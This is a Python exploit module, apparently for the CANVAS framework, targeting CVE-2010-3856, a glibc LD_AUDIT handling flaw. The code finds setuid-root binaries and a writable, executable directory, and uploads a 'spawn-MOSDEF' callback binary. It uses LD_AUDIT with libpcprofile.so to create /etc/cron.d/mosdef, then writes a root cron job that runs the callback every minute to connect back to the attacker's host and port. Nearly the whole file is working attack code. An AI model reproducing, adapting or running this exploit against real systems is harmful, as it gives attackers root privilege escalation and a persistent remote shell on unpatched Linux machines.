#!/usr/bin/env python
# -*- coding: utf-8 -*-
##ImmunityHeader v1
###############################################################################
## File       :  CVE_2010_3856.py
## Description:
##            :
## Created_On :  Mon Nov  1 14:19:18 ART 2010
## Created_By :  Agustin Gianni
##
## (c) Copyright 2010, Immunity, Inc. all rights reserved.
##
## vim: sw=4 ts=4 expandtab
###############################################################################

import time
import errno
import ctypes
import canvasengine
from shellcode import shellcodeGenerator
#from canvasexploit import canvasexploit
from ExploitTypes.localexploit import LocalExploit
from MOSDEF.makeexe import makelinuxexe

NAME="CVE_2010_3856"
DESCRIPTION="glibc rtld LD_AUDIT handling flaw."
DOCUMENTATION = {}
DOCUMENTATION['CVE Name'] = "CVE-2010-3856"
DOCUMENTATION['CVE Url'] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3856"
DOCUMENTATION['References'] = "http://seclists.org/fulldisclosure/2010/Oct/344"
DOCUMENTATION['VENDOR'] = "Linux"
DOCUMENTATION['Date public'] = "10/22/2010"
DOCUMENTATION['NOTES'] = """See the FD post for a ton of details, try this exploit on
RedHat derived distributions, this may also work against Ubuntu. If it fails but you
think the target is vulnerable, try Tavis' checks by hand as this module may not work
against some installations."""

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['ARCH'] = [ ['Linux',  'i386'] ]
PROPERTY['SITE'] = "Local"
VERSION = "1.0"

class theexploit(LocalExploit):
    def __init__(self):
        LocalExploit.__init__(self)
        self.name = NAME
        self.fd = -1
        self.suid = ""
        self.suids = {}
        self.wxdir = ""
        self.randdir = ""
        self.version = 0

        self.mosdef_callback = "spawn-MOSDEF"
        self.cron_file = "/etc/cron.d/mosdef"
        self.cron_job = None

    def build_cron_job(self):
        cron_job = "*/1 * * * * root export "
        cron_job += "MOSDEF_HOST=%s " % self.callback.ip
        cron_job += "MOSDEF_PORT=%d " % self.callback.port
        cron_job += "MOSDEF_TYPE=%d " % self.engine.getMosdefType(canvasengine.LINUXMOSDEF_INTEL)
        cron_job += "MOSDEF_ID=%d;" % self.engine.getNewMosdefID(self)
        #cron_job += "echo $MOSDEF_HOST > %s/worked;" % self.wxdir
        cron_job += "exec " + self.wxdir + "/" + self.mosdef_callback + ">> /dev/null 2>&1 &\n"

        print cron_job

        return cron_job

    def getArgs(self):
        return

    def cleanup(self, node):
        if self.fd != -1:
            self.xclose(node, self.fd)

        # We're not sure where we are at this point, so lets unlink/rmdir
        # everything we used.
        node.shell.unlink(self.wxdir + "/" + self.mosdef_callback)
        node.shell.unlink(self.cron_file)

    def xclose(self, node, fd):
            ret = node.shell.close(fd)
            while ret == -errno.EINTR:
                ret = node.shell.close(fd)
            return ret

    def neededListenerTypes(self):
        return [canvasengine.UNIVERSAL_MOSDEF]

    def find_setuid_files(self, node):
        S_ISUID = node.shell.libc.getdefine('S_ISUID')
        R_OK = node.shell.libc.getdefine('R_OK')
        suids = [ "/bin/su", "/bin/ping", "/bin/ping6", "/bin/umount",
                  "/bin/mount", "/sbin/unix_chkpwd", "/usr/bin/chfn",
                  "/usr/bin/chsh", "/usr/bin/crontab", "/usr/bin/passwd",
                  "/usr/bin/rcp", "/usr/bin/rlogin", "/usr/bin/sudo",
                  "/usr/sbin/mtr", "/usr/sbin/suexec", "/usr/sbin/seunshare" ]

        # Find all setuid root executables
        for suid in suids:
            (ret, stat) = node.shell.stat(suid)
            if ret < 0 or not stat["st_mode"] & S_ISUID or stat["st_uid"] != 0:
                continue;

            # We want to be able to read the suid.  This flaw is exploitable
            # as well without relying on this, but this needs to be implemented.
            if node.shell.access(suid, R_OK):
                self.suids[stat["st_dev"]] = suid

    def prepare(self, node):
        self.log("Cataloging setuid root files on system.")
        self.find_setuid_files(node)
        if not self.suids:
            self.log("Failed to find any setuid root files.")
            return False

        self.log("Found setuid file(s) on unique devices: " +
                 repr(self.suids.values()))

        self.log("Scanning for writable/executable directory.  Bear with it")
        self.wxdir = self.find_wx_dir(node)
        if not self.wxdir:
            self.log("Failed to find a writeable/executable directory")
            return False

        self.log("Found usable directory %s with suid %s" %
                 (self.wxdir, self.suid))

        # Work from the directory we found from now on.
        if node.shell.chdir(self.wxdir) < 0:
            self.log("Failed to chdir() to %s" % self.wxdir)
            return False

        self.cron_job = self.build_cron_job()
        self.log("Cron job to add is %s" %self.cron_job)

        # Change umask to 0
        node.shell.umask(0)

        return True

    def attack(self, node):
        # Creates the setup needed to abuse the bug on the remote node.
        if not self.prepare(node):
            return 0

        path = os.path.abspath(os.path.join(os.path.dirname(__file__), "Resources/"))
        r = node.upload("%s%s" % (path, self.mosdef_callback),
                        destfilename = self.wxdir + "/" +self.mosdef_callback)
        if r == 0:
            self.log("Upload of evil mosdef callback failed")
            self.cleanup(node)
            return 0

        # Initialize our evil environment
        environ = [ "LD_AUDIT=libpcprofile.so",
                    "PCPROFILE_OUTPUT=%s" % self.cron_file]

        r = node.shell.execve(self.suid, [], environ, 1)

        # Open the cron file and write the line
        O_WRONLY = node.shell.libc.getdefine('O_WRONLY')
        O_TRUNC = node.shell.libc.getdefine('O_TRUNC')
        self.fd = node.shell.open(self.cron_file, O_TRUNC | O_WRONLY)
        if self.fd < 0:
            self.log("Failed to open " + self.cron_file + " for writing")
            return False

        if node.shell.write(self.fd, self.cron_job) == 0:
            self.log("Failed to write to " + self.cron_file + " cron file")
            node.shell.close(self.fd)
            return False

        self.log("Sleeping 60 to wait for connect back")
        time.sleep(60)

        self.cleanup(node)

        ret = self.ISucceeded()

        return ret

    def test_wx_dirs(self, node, dirs):
        X_OK = node.shell.libc.getdefine('X_OK')
        W_OK = node.shell.libc.getdefine('W_OK')

        for dir in dirs:
            # If this directory is not on the same filesystem as the
            # setuid binary, we cannot use it, as we need to hardlink.
            (ret, stat) = node.shell.stat(dir)
            if ret < 0 or stat["st_dev"] not in self.suids:
                continue

            # If we cannot execute or write to the dir, skip it
            if not node.shell.access(dir, W_OK | X_OK):
                continue

            # XXX: if statvfs() fails we may want to do better.
            try:
                vstat = node.shell.statvfs(dir)
            except:
                continue

            # We don't want NOEXEC directories.
            if vstat["f_flag"] & node.shell.libc.getdefine('ST_NOEXEC'):
                continue

            # Nor do we want NOSUID directories.
            if vstat["f_flag"] & node.shell.libc.getdefine('ST_NOSUID'):
                continue

            # If we're here, the directory is suitable.
            self.suid = self.suids[stat["st_dev"]]
            return dir

        return ""

    def get_home_dir(self, node):
        # Next up is our home directory, assuming we can manage to determine
        # what it is in the first place.
        uid = node.shell.getuid()
        self.log("Trying to determine home directory for uid %d..." % uid)
        # XXX: yes, we do this the ugly way.  Implementing this in MOSDEF-libc
        # means we would have to emulate the glibc NSS layer in order to have
        # NIS and so on.  We might want to avoid this :-)
        pwdent = node.shell.runcommand("/usr/bin/getent passwd %d" % uid)
        pwdent = pwdent.split(':')
        # XXX: sanity check, we want to make sure this is not the shell
        # returning errors that getent was not found.
        if len(pwdent) == 7 and int(pwdent[2]) == uid:
            self.log("Found home directory: %s" % pwdent[-2])
            return pwdent[-2]
        else:
            self.log("Failed to determine home directory")
            return ""

    def __name(self, base, file):
        if base[-1] != '/':
            return base + '/' + file
        else:
            return base + file

    def test_dirs(self, node, root, exclude = [], depth = 2):
        S_IFDIR = node.shell.libc.getdefine('S_IFDIR')
        dirs = [root]

        for i in xrange(0, depth):
            for dir in dirs:
                exclude.append(self.__name(dir, '.'))
                exclude.append(self.__name(dir, '..'))
                dirs = dirs + [ self.__name(dir, d[0]) for d in node.shell.dodir(dir)
                       if self.__name(dir, d[0]) not in exclude and d[1]["st_mode"] & S_IFDIR ]

            exclude = exclude + dirs

        # See if any of these directories works.
        dir = self.test_wx_dirs(node, dirs)
        if dir:
            return dir

        return ""

    def find_wx_dir(self, node):
        # First pass, just have some hardcoded directories we check.
        dirs = [ '/dev/shm', '/var/tmp', '/usr/tmp', '/tmp' ]
        dir = self.test_wx_dirs(node, dirs)

        if dir:
            return dir

        # Now try if we have a home directory, and if so scan from there.
        dir = self.get_home_dir(node)
        if dir:
            self.log("Scanning home directory for wx directories.")
            dir = self.test_dirs(node, dir, dirs, 1)
            if dir:
                return dir

        # We didn't find any suitable directory, so we try a bit harder by
        # scanning from the root downwards a couple of layers.
        dir = self.test_dirs(node, "/", dirs + ["/proc"])
        if dir:
            return dir

        return ""

    def run(self):
        self.setInfo("%s (in progress)" % NAME)
        self.getArgs()

        if not self.callback:
            self.log('[-] No callback set!')
            return False

        for node in self.argsDict["passednodes"]:
            nodename=node.getname()
            caps = node.capabilities

            if "linux" not in caps:
                self.log("Node %s not a Linux node..." % nodename)
                continue
            else:
                return self.attack(node)

        return False

if __name__ == "__main__":
    print "This module is meant to be run only within CANVAS"
